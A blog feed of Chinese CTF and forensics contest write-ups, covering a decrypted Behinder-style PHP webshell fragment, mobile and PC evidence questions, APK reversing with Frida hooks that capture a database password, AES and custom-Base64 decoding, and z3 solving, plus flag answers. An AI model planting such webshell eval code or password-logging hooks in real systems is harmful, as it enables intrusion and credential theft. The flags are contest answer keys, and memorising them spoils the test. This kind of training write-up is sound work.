$func=$arr[0];   $params=$arr[1];     class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;   @call_user_func(new C(),$params); ?&gt;</code></pre><p>得知密码是rebeyond 直接用puzzlesolver就可以爆破解密</p><p>直接翻到最后一个流 先解密请求包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021544.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021955.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722032.jpg" alt="img"> </p><p>两次base64解密 发现确实是在读取flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021115.jpg" alt="img"> </p><p>那最后一个返回包就是flag的内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722033.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722034.jpg" alt="img"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第二届黄河流域-西柚喵帕斯&quot;&gt;&lt;a href=&quot;#第二届黄河流域-西柚喵帕斯&quot; class=&quot;headerlink&quot; title=&quot;第二届黄河流域-西柚喵帕斯&quot;&gt;&lt;/a&gt;&lt;strong&gt;第二届黄河流域-西柚喵帕斯&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;取证分析</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="crypto" scheme="http://w3nx1z1.github.io/tags/crypto/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
    <category term="re" scheme="http://w3nx1z1.github.io/tags/re/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>第七届精武杯-西柚喵帕斯wp</title>
    <link href="http://w3nx1z1.github.io/2024/05/03/%E7%AC%AC%E4%B8%83%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AF-%E8%A5%BF%E6%9F%9A%E7%9A%84%E5%96%B5%E5%B8%95%E6%96%AFWP/"/>
    <id>http://w3nx1z1.github.io/2024/05/03/%E7%AC%AC%E4%B8%83%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AF-%E8%A5%BF%E6%9F%9A%E7%9A%84%E5%96%B5%E5%B8%95%E6%96%AFWP/</id>
    <published>2024-05-03T14:14:23.575Z</published>
    <updated>2024-05-03T14:15:10.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第七届精武杯-西柚的喵帕斯WP"><a href="#第七届精武杯-西柚的喵帕斯WP" class="headerlink" title="第七届精武杯-西柚的喵帕斯WP"></a>第七届精武杯-西柚的喵帕斯WP</h1><p><strong>计算机&amp;&amp;手机</strong></p><p><strong>1. 请综合分析计算机和手机检材，计算机最近一次登录的账户名是</strong></p><pre><code>admin</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730494.jpg" alt="img"> </p><p><strong>2.请综合分析计算机和手机检材，计算机最近一次插入的USB存储设备串号是</strong></p><pre><code>S3JKNX0JA05097Y</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730353.jpg" alt="img"> </p><p><strong>3.请综合分析计算机和手机检材，谢弘的房间号是（）室</strong></p><pre><code>201</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730356.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730364.jpg" alt="img"> </p><p><strong>4.请综合分析计算机和手机检材，曹锦芳的手机号后四位是</strong></p><pre><code>0683</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271945444.jpg" alt="img"></p><h3 id="5-请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名-电话-地址去重后共有多少条？"><a href="#5-请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名-电话-地址去重后共有多少条？" class="headerlink" title="5.请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名+电话+地址去重后共有多少条？"></a>5.<strong>请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名+电话+地址去重后共有多少条？</strong></h3><pre><code>4997条</code></pre><p>全部提取出来 其中顺丰2k是伪加密 改一下就可以正常解压 顺丰1k直接修改后缀名为<code>xlsx</code> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261733131.png" alt="image-20240426173356074"></p><p>使用网钜数据分析 导入4个excel表格</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261735436.png" alt="image-20240426173535343"></p><p>由于没有表头 所以需要再算上第一行 一共是4997条数据</p><p><strong>6.请综合分析计算机和手机检材，统计检材内共有几份购票平台相关的公民信息文档</strong></p><p>3份</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731735.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731736.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271945290.jpg" alt="img"> </p><p><strong>7.请综合分析计算机和手机检材，樊海锋登记的邮箱账号是</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271945827.jpg" alt="img"> </p><p><strong>8.请综合分析计算机和手机检材，统计购票平台相关的文档，去重后共有多少条身份证号为上海的公民信息？</strong></p><p>先搜一下身份证为上海的特征</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731743.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731754.jpg" alt="img"> </p><pre><code class="python">import pandas as pd  # 读取txt文件 data = pd.read_csv(&#39;12306 裤子1.txt&#39;, delimiter=&#39;----&#39;, header=None, engine=&#39;python&#39;)  # 将数据存储到xlsx文件中 data.to_excel(&#39;output.xlsx&#39;, index=False)  # 对第四列进行去重处理 data.drop_duplicates(subset=[3], keep=&#39;first&#39;, inplace=True)  # 筛选出上海公民shanghai_citizens = data[data[3].str.startswith(&#39;31&#39;)]  # 将上海公民的数据存储到一个新的xlsx文件中 shanghai_citizens.to_excel(&#39;shanghai_citizens.xlsx&#39;, index=False) </code></pre><p>跑出来109个</p><p><strong>9.请分析手机检材，2022年11月7日，嫌疑人发送了几条短信？</strong></p><p>3条</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731916.jpg" alt="img"> </p><p><strong>10.请分析手机检材，其中保存了多少条公民住房信息？</strong></p><p>张三 李四 王武 范宏伟 郭何 章衡 关星 常见 余辉遥 陈剑 吴涵 张智  12个人 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731003.jpg" alt="img"></p><h2 id="apk功能分析"><a href="#apk功能分析" class="headerlink" title="apk功能分析"></a>apk功能分析</h2><h3 id="1、请分析1-备忘录-apk反编译出的文件中，正确答案在哪个文件里？"><a href="#1、请分析1-备忘录-apk反编译出的文件中，正确答案在哪个文件里？" class="headerlink" title="1、请分析1.备忘录.apk反编译出的文件中，正确答案在哪个文件里？"></a>1、<strong>请分析1.备忘录.apk反编译出的文件中，正确答案在哪个文件里？</strong></h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032156946.png" alt="图片"></p><h3 id="2、请分析1-备忘录-apk并找到程序中的主activity是？（答案格式：com-tencent-mm-activity）"><a href="#2、请分析1-备忘录-apk并找到程序中的主activity是？（答案格式：com-tencent-mm-activity）" class="headerlink" title="2、请分析1.备忘录.apk并找到程序中的主activity是？（答案格式：com.tencent.mm.activity）"></a>2、<strong>请分析1.备忘录.apk并找到程序中的主activity是？（答案格式：com.tencent.mm.activity）</strong></h3><pre><code class="Plain">com.hl.memorandum.MainActivity</code></pre><h3 id="3、请分析1-备忘录-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#3、请分析1-备忘录-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="3、请分析1.备忘录.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>3、请分析1.备忘录.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><pre><code class="Plain">HL&#123;d0b2058a-ac29-11ed-807f-acde48001122&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157566.png" alt="图片"></p><h3 id="4、请分析2-easyapk-apk中SharedPreferences配置文件的名称-包括后缀-是什么"><a href="#4、请分析2-easyapk-apk中SharedPreferences配置文件的名称-包括后缀-是什么" class="headerlink" title="4、请分析2.easyapk.apk中SharedPreferences配置文件的名称(包括后缀)是什么?"></a>4、<strong>请分析2.easyapk.apk中SharedPreferences配置文件的名称(包括后缀)是什么?</strong></h3><p>MT管理器查看data&#x2F;data&#x2F;&lt;包名&gt;&#x2F;shared_prefs&#x2F;</p><pre><code class="Plain">myprefs.xml</code></pre><h3 id="5、请分析2-easyapk-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#5、请分析2-easyapk-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="5、请分析2.easyapk.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>5、请分析2.easyapk.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><pre><code class="Plain">HL&#123;55c99ed4-d894-ae59-3a3b-6fe3eed793e7&#125;</code></pre><p>看一下发现equal明文比对</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157866.png" alt="图片"></p><p>用frida hook equal函数拦截返回值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157414.png" alt="图片"></p><p>其实还有一个思路直接去找对应的str1-str5的值</p><h3 id="6、-请分析3-verify-apk，该程序中所使用的AES加密KEY值为"><a href="#6、-请分析3-verify-apk，该程序中所使用的AES加密KEY值为" class="headerlink" title="6、 请分析3.verify.apk，该程序中所使用的AES加密KEY值为"></a>6、 请分析3.verify.apk，该程序中所使用的AES加密KEY值为</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157389.png" alt="图片"></p><h3 id="7、请分析3-verify-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#7、请分析3-verify-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="7、请分析3.verify.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>7、请分析3.verify.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><pre><code class="Plain">HL&#123;301b6b90-ac37-11ed-bad4-5811224dd424&#125;</code></pre><p>先用上一题拿到的key解aes</p><pre><code class="Python">from Crypto.Cipher import AESimport base64def decrypt_aes(key, iv, ciphertext):    cipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))    plaintext = cipher.decrypt(ciphertext)    return plaintext.rstrip(b&#39;\0&#39;)def main():    # AES key，IV 和 ciphertext（密文）    key = b&#39;thisisyouraeskey&#39;    iv = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]    ciphertext = base64.b64decode(b&#39;tPbnK29ENaqgPANeD1Hud3KyiS4uf8oaSa0b6ldRDHs=&#39;)    # 解密    decrypted_data = decrypt_aes(key, iv, ciphertext)    print(decrypted_data.decode(&#39;utf-8&#39;))if __name__ == &quot;__main__&quot;:    main()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032158767.png" alt="图片"></p><p>接下来是misc……</p><p>拆包apk后找到一个lookme文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032158212.png" alt="图片"></p><p>winhex打开发现是7z文件头</p><p>改后缀输入密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032158828.png" alt="图片"></p><p>得到lookme.txt，内容为flag</p><h3 id="8、请分析4-easyjni-zip-压缩包中数据库的解密秘钥为"><a href="#8、请分析4-easyjni-zip-压缩包中数据库的解密秘钥为" class="headerlink" title="8、请分析4.easyjni.zip,压缩包中数据库的解密秘钥为"></a>8、请分析4.easyjni.zip,压缩包中数据库的解密秘钥为</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032200401.png" alt="图片"></p><p>找到密钥的获取函数<br>编写frida脚本</p><pre><code>setImmediate(function () &#123;   Java.perform(function () &#123;        var SQLiteOpenHelper = Java.use(&quot;net.sqlcipher.database.SQLiteOpenHelper&quot;);//获取类的引用        SQLiteOpenHelper.getWritableDatabase.overload(&#39;java.lang.String&#39;).implementation = function (password) &#123;//拦截getWritableDatabase方法的调用并指定参数类型           console.log(&quot;SQLiteOpenHelper.getWritableDatabase is called: password=&quot; + password);           var result = this.getWritableDatabase(password);           console.log(&quot;SQLiteOpenHelper.getWritableDatabase result=&quot; + result);           return result;        &#125;;    &#125;);&#125;);</code></pre><p>再根据判断条件构造符合要求的un和pw</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032159425.png" alt="图片"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032201396.png" alt="图片"></p><h3 id="9、请分析4-easyjni-zip并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#9、请分析4-easyjni-zip并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="9、请分析4.easyjni.zip并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>9、请分析4.easyjni.zip并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032159511.png" alt="图片"></p><p>解密数据库拿到加密的账号密码：</p><p>账号密码的加密算法在 so 文件中，分析 so 文件，对字符串的每一位进行了加<br>减 以及位置交换等操作，最后进行了 Base64 换表加密。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032201251.png" alt="图片"></p><pre><code class="python">import base64base64_chars = list(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;)a = base64_chars[3]base64_chars[3] = base64_chars[6]base64_chars[6] = aa = base64_chars[7]base64_chars[7] = base64_chars[9]base64_chars[9] = aa = base64_chars[20]base64_chars[20] = base64_chars[21]base64_chars[21] = aa = base64_chars[26]base64_chars[26] = base64_chars[1]base64_chars[1] = aa = base64_chars[30]base64_chars[30] = base64_chars[39]base64_chars[39] = aa = base64_chars[2]base64_chars[2] = base64_chars[48]base64_chars[48] = as1 = &quot;&quot;.join(i for i in base64_chars)s2 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#39;data = &quot;MXpjNjRjMzVyYl4zLmACMF8CXi1hMl9jXldbieFIRG91RJFJ&quot;result = list(base64.b64decode(data.translate(str.maketrans(s1, s2)).encode(&#39;utf-8&#39;)))pLen = len(result) - 11for j in range(0, pLen-1, 2): i = result[j] result[j] = result[j+1] result[j+1] = ifor i in range(0, int(pLen/2)): j = result[i] result[i] = result[pLen-1-i] result[pLen-1-i] = jfor i in range(pLen, pLen+11): result[i] = result[i] - 15for i in range(pLen): result[i] = result[i] + 3aa = &quot;&quot;.join(chr(i) for i in result)print(aa[-11:] + aa[:-11])</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032208256.png" alt="图片"></p><h3 id="10、请分析5-calc-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#10、请分析5-calc-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="10、请分析5.calc.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>10、请分析5.calc.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><p>Java 层只有验证输入是否正确的逻辑，算法都在 so 文件中。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032209364.png" alt="图片"></p><p>可知这里是加密函数：<br>ida 不能 F5，分析得知是没有识别 switch 结构，自定义 switch 结构即可。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032209496.png" alt="图片"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032209496.png" alt="图片"></p><pre><code class="c">//反编译后的函数：__int64 sub_E7EC()&#123; __int64 v0; // x9 int i; // [xsp+1Ch] [xbp-24h] unsigned __int8 *v3; // [xsp+20h] [xbp-20h] __int64 v4; // [xsp+28h] [xbp-18h] int v5; // [xsp+30h] [xbp-10h] int v6; // [xsp+34h] [xbp-Ch] int v7; // [xsp+38h] [xbp-8h] v7 = 0; v6 = 0; v5 = 0; v4 = 0LL; v3 = (unsigned __int8 *)sub_EA34(); for ( i = 0; ; ++i ) &#123; if ( i &gt;= 418 ) return 1; if ( (unsigned int)byte_34000[i] - 1 &lt;= 0xDuLL ) break;LABEL_20: ; &#125; switch ( (unsigned int)jpt_E874 ) &#123; case 0u: v4 ^= 0x51uLL; goto LABEL_20; case 1u: dword_341A4[v7] *= 2; goto LABEL_20; case 2u: v6 = *v3; goto LABEL_20; case 4u: v4 += (unsigned int)(v6 * dword_341A4[v7]); //形式类似方程中的 x1 * 12 + x2 * 14 + x3 * 52 ....... goto LABEL_20; case 5u: ++v7; goto LABEL_20; case 6u: ++v3; goto LABEL_20; case 7u: ++v4; goto LABEL_20; case 8u: dword_341A4[v7] += 12; goto LABEL_20; case 9u: --v4; goto LABEL_20; case 0xAu: v0 = v5++; if ( v4 == qword_342A8[v0] ) //比较值 &#123; v4 = 0LL; goto LABEL_20; &#125; return 0; case 0xBu: v3 -= 8; goto LABEL_20; case 0xCu: dword_341A4[v7] ^= 0x20u; goto LABEL_20; case 0xDu: dword_341A4[v7] -= 3; goto LABEL_20; default: goto LABEL_20; &#125;&#125;</code></pre><p>进行简单修改就可以使用 C 跑起来</p><pre><code class="C">#include &lt;stdio.h&gt;int main()&#123; __int64 v0; // x9 int i; // [xsp+1Ch] [xbp-24h] //unsigned __int8 *v3; // [xsp+20h] [xbp-20h] __int64 v4; // [xsp+28h] [xbp-18h] int v5; // [xsp+30h] [xbp-10h] int v6; // [xsp+34h] [xbp-Ch] int v7; // [xsp+38h] [xbp-8h] unsigned char byte_34000[420] = &#123; 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x02, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x09, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x02, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x01, 0x01, 0x0A, 0x06, 0x07, 0x03, 0x0E, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x0D, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x0D, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x02, 0x05, 0x08, 0x0A, 0x06, 0x01, 0x01, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x09, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x01, 0x01, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x0D, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x01, 0x01, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x0E, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x00, 0x00 &#125;;unsigned int dword_341A4[65] = &#123; 0x00000091, 0x00000030, 0x00000038, 0x0000009A, 0x00000036, 0x00000023, 0x0000004A, 0x0000002A, 0x0000002D, 0x00000094, 0x00000024, 0x00000036, 0x00000018, 0x0000002D, 0x00000036, 0x00000020, 0x00000033, 0x00000094, 0x00000038, 0x0000009A, 0x00000162, 0x00000023, 0x000000AE, 0x0000002A, 0x0000000F, 0x00000030, 0x0000004A, 0x0000009A, 0x00000036, 0x00000033, 0x0000004A, 0x0000002A, 0x00000041, 0x00000030, 0x00000038, 0x0000009A, 0x00000036, 0x00000023, 0x0000004A, 0x0000008E, 0x0000005F, 0x00000030, 0x00000038, 0x0000004A, 0x00000036, 0x00000023, 0x0000002C, 0x0000002A, 0x00000091, 0x00000044, 0x00000038, 0x0000000F, 0x00000036, 0x00000023, 0x0000004A, 0x0000002A, 0x00000091, 0x00000030, 0x00000060, 0x0000009A, 0x0000009A, 0x00000023, 0x0000004A, 0x0000002A, 0x00000000&#125;; unsigned long qword_342A8[8] = &#123; 0x000000000000E51E, 0x0000000000009DE7, 0x00000000000137F6, 0x000000000000BEBA, 0x00000000000101A2, 0x00000000000092E8, 0x0000000000009204, 0x000000000000EF22 &#125;; char *v3 = &quot;12345678&quot;; v7 = 0; v6 = 0; v5 = 0; v4 = 0LL; for ( i = 0; i &lt; 418; ++i ) &#123; switch (byte_34000[i]) &#123; case 1u:v4 ^= 0x51uLL; goto LABEL_19; case 2u: dword_341A4[v7] *= 2; goto LABEL_19; case 3u: v6 = *v3; goto LABEL_19; case 5u: v4 += (unsigned int) (v6 * dword_341A4[v7]); ////在这里将值进行输出 printf(&quot;x%c * %d + &quot;, v6, dword_341A4[v7]); goto LABEL_19; case 6u: ++v7; goto LABEL_19; case 7u: ++v3; goto LABEL_19; case 8u: ++v4; goto LABEL_19; case 9u: dword_341A4[v7] += 12; goto LABEL_19; case 0xAu: --v4; goto LABEL_19; case 0xBu: v0 = v5++; printf(&quot;= %d\n&quot;, qword_342A8[v0]); //将最终比较的数据进行输出 break; //return 0; case 0xCu: v3 -= 8; goto LABEL_19; case 0xDu: dword_341A4[v7] ^= 0x20u; goto LABEL_19; case 0xEu: dword_341A4[v7] -= 3; goto LABEL_19; default: goto LABEL_19; LABEL_19: break; &#125; &#125; &#125;&#125;//跑起来后，会输出如下形式，8 元一次方程：x1 * 145 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74 + x8 * 42 = 58654x1 * 90 + x2 * 148 + x3 * 36 + x4 * 54 + x5 * 24 + x6 * 45 + x7 * 54 + x8 * 32 = 40423x1 * 51 + x2 * 145 + x3 * 56 + x4 * 186 + x5 * 354 + x6 * 35 + x7 * 174 + x8 * 42 = 79862x1 * 47 + x2 * 48 + x3 * 74 + x4 * 154 + x5 * 54 + x6 * 51 + x7 * 74 + x8 * 42 = 48826x1 * 65 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74+ x8 * 142 = 65954x1 * 95 + x2 * 48 + x3 * 56 + x4 * 74 + x5 * 54 + x6 * 35 + x7 * 44 +x8 * 42 = 37608x1 * 145 + x2 * 68 + x3 * 56 + x4 * 15 + x5 * 54 + x6 * 35 + x7 * 74 + x8 * 42 = 37380x1 * 145 + x2 * 48 + x3 * 96 + x4 * 154 + x5 * 154 + x6 * 35 + x7 * 74 + x8 * 42 = 61218</code></pre><p>z3直接解</p><pre><code class="python">from z3 import *import hashlibdef hash_md5(data): hash=hashlib.md5() hash.update(bytes(data,encoding=&#39;utf-8&#39;)) return hash.hexdigest()x1 = Int(&#39;x1&#39;)x2 = Int(&#39;x2&#39;)x3 = Int(&#39;x3&#39;)x4 = Int(&#39;x4&#39;)x5 = Int(&#39;x5&#39;)x6 = Int(&#39;x6&#39;)x7 = Int(&#39;x7&#39;)x8 = Int(&#39;x8&#39;)s = Solver()s.add(x1 * 145 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74 + x8 * 42 == 58654)s.add(x1 * 90 + x2 * 148 + x3 * 36 + x4 * 54 + x5 * 24 + x6 * 45 + x7* 54 + x8 * 32 == 40423)s.add(x1 * 51 + x2 * 145 + x3 * 56 + x4 * 186 + x5 * 354 + x6 * 35 + x7 * 174 + x8 * 42 == 79862)s.add(x1 * 47 + x2 * 48 + x3 * 74 + x4 * 154 + x5 * 54 + x6 * 51 + x7* 74 + x8 * 42 == 48826)s.add(x1 * 65 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74 + x8 * 142 == 65954)s.add(x1 * 95 + x2 * 48 + x3 * 56 + x4 * 74 + x5 * 54 + x6 * 35 + x7 * 44 + x8 * 42 == 37608)s.add(x1 * 145 + x2 * 68 + x3 * 56 + x4 * 15 + x5 * 54 + x6 * 35 + x7* 74 + x8 * 42 == 37380)s.add(x1 * 145 + x2 * 48 + x3 * 96 + x4 * 154 + x5 * 154 + x6 * 35 + x7 * 74 + x8 * 42 == 61218)if (s.check() == sat): model = s.model() print(model) flag=&quot;&quot; for i in range(1, 9): if (model[eval(&quot;x&quot; + str(i))] != None): flag += chr(model[eval(&quot;x&quot; + str(i))].as_long().real) else: flag += &quot; &quot; print(&quot;HL&#123;&quot; + hash_md5(flag) + &quot;&#125;&quot;)</code></pre><p>app 的正确输入：AZaz09@}<br>最终答案：HL{96233a87c59bf7f0aa2ed16d9bc2e07a}</p><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><h3 id="1-请对所给服务器检材进行分析，请-写-出-管-理-员-安-装“mdadm-4-1-9-el7-9-x86-64”的时间？（答案格式：18-18-18）"><a href="#1-请对所给服务器检材进行分析，请-写-出-管-理-员-安-装“mdadm-4-1-9-el7-9-x86-64”的时间？（答案格式：18-18-18）" class="headerlink" title="1. 请对所给服务器检材进行分析，请 写 出 管 理 员 安 装“mdadm-4.1-9.el7_9.x86_64”的时间？（答案格式：18:18:18）"></a><strong>1. 请对所给服务器检材进行分析，请 写 出 管 理 员 安 装“mdadm-4.1-9.el7_9.x86_64”的时间？（答案格式：18:18:18）</strong></h3><pre><code>13:13:01</code></pre><p>使用命令搜索</p><p>rpm可以提供包的名称、版本、发布信息、安装日期、大小、构建日期、构建主机、安装后的大小、来源RPM、许可证、URL、摘要和描述等信息。</p><pre><code>rpm -qi mdadm </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261517242.png" alt="image-20240426151736184"></p><p>Install Data就是安装时间 <code>01:13:01 PM CST</code> 是下午的1点13分1秒 